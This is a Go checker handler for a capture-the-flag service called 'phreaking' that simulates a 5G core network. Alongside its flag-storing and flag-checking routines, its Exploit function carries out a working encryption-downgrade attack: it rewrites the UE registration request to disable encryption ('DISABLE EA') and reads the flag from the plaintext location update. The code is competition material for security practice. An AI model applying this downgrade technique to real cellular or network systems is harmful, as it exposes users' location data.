package handler

import (
	"context"
	"errors"
	"net"
	"os"
	"strconv"

	"checker/pkg/crypto"
	"checker/pkg/io"
	"checker/pkg/ngap"
	"checker/pkg/pb"

	"github.com/enowars/enochecker-go"
	"github.com/redis/go-redis/v9"
	"github.com/sirupsen/logrus"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/metadata"
)

var serviceInfo = &enochecker.InfoMessage{
	ServiceName:     "phreaking",
	FlagVariants:    1,
	NoiseVariants:   0,
	HavocVariants:   0,
	ExploitVariants: 1,
}

var ErrVariantNotFound = errors.New("variant not found")

type Handler struct {
	log *logrus.Logger
	db  *redis.Client
}

func New(log *logrus.Logger, db *redis.Client) *Handler {
	return &Handler{
		log: log,
		db:  db,
	}
}

func (h *Handler) PutFlag(ctx context.Context, message *enochecker.TaskMessage) (*enochecker.HandlerInfo, error) {
	portNum := strconv.Itoa(int(message.CurrentRoundId % 10))
	port := "993" + portNum
	var conn *grpc.ClientConn
	conn, err := grpc.Dial(message.Address+":"+port, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		return nil, err
	}
	defer conn.Close()

	c := pb.NewLocationClient(conn)

	md := metadata.Pairs("auth", string(os.Getenv("PHREAKING_GRPC_PASS")))
	ctx_grpc := metadata.NewOutgoingContext(context.Background(), md)
	_, err = c.UpdateLocation(ctx_grpc, &pb.Loc{Position: message.Flag})
	if err != nil {
		return nil, err
	}
	port = "606" + portNum
	if err = h.db.Set(ctx, message.TaskChainId, port, 0).Err(); err != nil {
		h.log.Error(err)
		return nil, enochecker.NewMumbleError(errors.New("not able to write taskid to db"))
	}
	return enochecker.NewPutFlagInfo(port), nil
}

func (h *Handler) getFlagLocation(ctx context.Context, message *enochecker.TaskMessage) error {
	coretcpAddr, err := net.ResolveTCPAddr("tcp", message.Address+":3399")
	if err != nil {
		return err
	}

	coreConn, err := net.DialTCP("tcp", nil, coretcpAddr)
	if err != nil {
		return err
	}

	port, err := h.db.Get(ctx, message.TaskChainId).Result()
	if err != nil {
		return enochecker.NewMumbleError(errors.New("no entry for task id"))
	}

	uetcpAddr, err := net.ResolveTCPAddr("tcp", message.Address+":"+port)
	if err != nil {
		return err
	}

	ueConn, err := net.DialTCP("tcp", nil, uetcpAddr)
	if err != nil {
		return err
	}

	setup := ngap.NGSetupRequestMsg{GranId: 0, Tac: 0, Plmn: 0}
	buf, _ := ngap.EncodeMsg(ngap.NGSetupRequest, &setup)

	err = io.SendMsg(coreConn, buf)
	if err != nil {
		return err
	}

	reply, err := io.RecvMsg(coreConn)
	if err != nil {
		return err
	}

	reply, err = io.RecvMsg(ueConn)
	if err != nil {
		return err
	}

	initUeMsg := ngap.InitUEMessageMsg{NasPdu: reply, RanUeNgapId: 1}
	buf, _ = ngap.EncodeMsg(ngap.InitUEMessage, &initUeMsg)

	err = io.SendMsg(coreConn, buf)
	if err != nil {
		return err
	}

	// AuthReq
	reply, err = io.RecvMsg(coreConn)
	if err != nil {
		return err
	}

	var down ngap.DownNASTransMsg
	err = ngap.DecodeMsg(reply[1:], &down)
	if err != nil {
		return errors.New("cannot decode")
	}

	err = io.SendMsg(ueConn, down.NasPdu)
	if err != nil {
		return err
	}

	reply, err = io.RecvMsg(ueConn)
	if err != nil {
		return err
	}

	// AuthRes
	up := ngap.UpNASTransMsg{NasPdu: reply, RanUeNgapId: 1, AmfUeNgapId: down.AmfUeNgapId}
	buf, _ = ngap.EncodeMsg(ngap.UpNASTrans, &up)

	err = io.SendMsg(coreConn, buf)
	if err != nil {
		return err
	}

	// SecModeCmd
	reply, err = io.RecvMsg(coreConn)
	if err != nil {
		return err
	}

	down = ngap.DownNASTransMsg{}

	err = ngap.DecodeMsg(reply[1:], &down)
	if err != nil {
		return errors.New("cannot decode")
	}

	err = io.SendMsg(ueConn, down.NasPdu)
	if err != nil {
		return err
	}

	// LocationUpdate
	reply, err = io.RecvMsg(ueConn)
	if err != nil {
		return err
	}

	dec := crypto.DecryptAES(reply[9:])

	var loc ngap.LocationUpdateMsg
	err = ngap.DecodeMsg(dec, &loc)
	if err != nil {
		return errors.New("cannot decode")
	}
	if loc.Location == message.Flag {
		return nil
	}
	return enochecker.ErrFlagNotFound
}

func (h *Handler) GetFlag(ctx context.Context, message *enochecker.TaskMessage) error {
	switch message.VariantId {
	case 0:
		return h.getFlagLocation(ctx, message)
	}

	return ErrVariantNotFound
}

func (h *Handler) GetServiceInfo() *enochecker.InfoMessage {
	return serviceInfo
}

func (h *Handler) Exploit(ctx context.Context, message *enochecker.TaskMessage) (*enochecker.HandlerInfo, error) {
	coretcpAddr, err := net.ResolveTCPAddr("tcp", message.Address+":3399")
	if err != nil {
		return nil, err
	}

	coreConn, err := net.DialTCP("tcp", nil, coretcpAddr)
	if err != nil {
		return nil, err
	}

	portNum := strconv.Itoa(int(message.CurrentRoundId % 10))
	port := "606" + portNum

	uetcpAddr, err := net.ResolveTCPAddr("tcp", message.Address+":"+port)
	if err != nil {
		return nil, err
	}

	ueConn, err := net.DialTCP("tcp", nil, uetcpAddr)
	if err != nil {
		return nil, err
	}

	setup := ngap.NGSetupRequestMsg{GranId: 0, Tac: 0, Plmn: 0}
	buf, _ := ngap.EncodeMsg(ngap.NGSetupRequest, &setup)

	err = io.SendMsg(coreConn, buf)
	if err != nil {
		return nil, err
	}

	reply, err := io.RecvMsg(coreConn)
	if err != nil {
		return nil, err
	}

	reply, err = io.RecvMsg(ueConn)
	if err != nil {
		return nil, err
	}

	var reg ngap.NASRegRequestMsg
	err = ngap.DecodeMsg(reply[1:], &reg)
	if err != nil {
		return nil, errors.New("cannot decode")
	}

	// DISABLE EA
	reg.SecCap.EA = 0

	pdu, _ := ngap.EncodeMsg(ngap.NASRegRequest, &reg)

	initUeMsg := ngap.InitUEMessageMsg{NasPdu: pdu, RanUeNgapId: 1}
	buf, _ = ngap.EncodeMsg(ngap.InitUEMessage, &initUeMsg)

	err = io.SendMsg(coreConn, buf)
	if err != nil {
		return nil, err
	}

	// AuthReq
	reply, err = io.RecvMsg(coreConn)
	if err != nil {
		return nil, err
	}

	var down ngap.DownNASTransMsg
	err = ngap.DecodeMsg(reply[1:], &down)
	if err != nil {
		return nil, errors.New("cannot decode")
	}

	err = io.SendMsg(ueConn, down.NasPdu)
	if err != nil {
		return nil, err
	}

	reply, err = io.RecvMsg(ueConn)
	if err != nil {
		return nil, err
	}

	// AuthRes
	up := ngap.UpNASTransMsg{NasPdu: reply, RanUeNgapId: 1, AmfUeNgapId: down.AmfUeNgapId}
	buf, _ = ngap.EncodeMsg(ngap.UpNASTrans, &up)

	err = io.SendMsg(coreConn, buf)
	if err != nil {
		return nil, err
	}

	// SecModeCmd
	reply, err = io.RecvMsg(coreConn)
	if err != nil {
		return nil, err
	}

	down = ngap.DownNASTransMsg{}

	err = ngap.DecodeMsg(reply[1:], &down)
	if err != nil {
		return nil, errors.New("cannot decode")
	}

	err = io.SendMsg(ueConn, down.NasPdu)
	if err != nil {
		return nil, err
	}

	// LocationUpdate
	reply, err = io.RecvMsg(ueConn)
	if err != nil {
		return nil, err
	}

	var loc ngap.LocationUpdateMsg
	err = ngap.DecodeMsg(reply[9:], &loc)
	if err != nil {
		return nil, errors.New("cannot decode")
	}
	return enochecker.NewExploitInfo(loc.Location), nil

}

var putnoisecalled []string

func (h *Handler) PutNoise(ctx context.Context, message *enochecker.TaskMessage) error {
	putnoisecalled = append(putnoisecalled, message.TaskChainId)
	return nil
}

func (h *Handler) GetNoise(ctx context.Context, message *enochecker.TaskMessage) error {
	for _, i := range putnoisecalled {
		if i == message.TaskChainId {
			return nil
		}
	}
	return enochecker.NewMumbleError(errors.New("put flag was not called beforehand"))
}

func (h *Handler) Havoc(ctx context.Context, message *enochecker.TaskMessage) error {
	return nil
}
